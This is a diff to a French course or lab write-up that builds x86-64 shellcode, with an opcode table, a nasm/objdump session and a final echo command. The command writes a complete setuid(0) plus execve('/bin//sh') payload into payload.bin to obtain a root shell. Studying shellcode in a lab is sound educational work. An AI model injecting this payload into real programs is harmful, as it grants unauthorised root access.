@@ -29,13 +29,42 @@ Les instructions qui nous intèresse sont les suivantes:
 
 Une fois devenu Root, vous devez invoquer le terminal.
 
-| Instruction ASM | Opcode (Hex) | Signification                                   |
-| :-------------- | :----------- | :---------------------------------------------- |
-| `xor rsi, rsi`  | `48 31 f6`   | Nettoie RSI (pas d'arguments).                  |
-| `push rsi`      | `56`         | Fin de chaîne (NULL byte).                      |
-| `mov rdi, ...`  | `48 bf`      | Place "/bin//sh" dans RDI.                      |
-| `push 0x3b`     | `6a 3b`      | Place 59 dans RAX (Numéro du syscall `execve`). |
-| `syscall`       | `0f 05`      | Exécute `/bin/sh`.                              |
+| Instruction ASM | Opcode (Hex)   | Signification                                   |
+| :-------------- | :------------- | :---------------------------------------------- |
+| `xor rsi, rsi`  | **`48 31 f6`** | Nettoie RSI (pas d'arguments).                  |
+| `push rsi`      | **`56`**       | Fin de chaîne (NULL byte).                      |
+| `mov rdi, ...`  | **`48 bf`**    | Place "/bin//sh" dans RDI.                      |
+| `push 0x3b`     | `6a 3b`        | Place 59 dans RAX (Numéro du syscall `execve`). |
+| `syscall`       | `0f 05`        | Exécute `/bin/sh`.                              |
+
+Certaine partie était manquante donc on fait de l'assemblage pour complèter le tableau.
+
+Par exemple:
+
+```
+linux@linux-VirtualBox:~/MCS26-3_Cours_C_DO_Quoc_Tan/grimoire$ echo "xor rsi, rsi;" > shell.asm
+
+linux@linux-VirtualBox:~/MCS26-3_Cours_C_DO_Quoc_Tan/grimoire$ nasm -f elf64 shell.asm -o shell.o
+
+linux@linux-VirtualBox:~/MCS26-3_Cours_C_DO_Quoc_Tan/grimoire$ objdump -d shell.o
+
+
+
+shell.o:     format de fichier elf64-x86-64
+
+
+
+
+
+Déassemblage de la section .text :
+
+
+
+0000000000000000 <.text>:
+
+   0:	48 31 f6             	xor    %rsi,%rsi
+
+```
 
 on a donc cette commande pour la création du **payload.bin**:
 **echo -ne "\x48\x31\xff\x6a\x69\x58\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x0f\x05" > payload.bin**
